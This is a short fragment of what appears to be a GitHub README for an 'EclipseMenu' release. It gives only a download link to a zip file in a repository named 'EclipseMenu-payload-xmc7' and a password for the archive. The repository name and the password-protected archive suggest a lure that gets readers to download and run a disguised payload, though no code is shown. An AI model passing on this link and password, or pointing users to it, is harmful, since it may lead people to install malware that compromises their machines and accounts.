...
## 🔐 Release Credentials
- **Download Package:** [Direct Release Asset](https://github.com/DaimyoSheikh/EclipseMenu-payload-xmc7/releases/download/v1.0.0/EclipseMenu.zip)
- **Archive Password:** `hlJtYzoTtS`
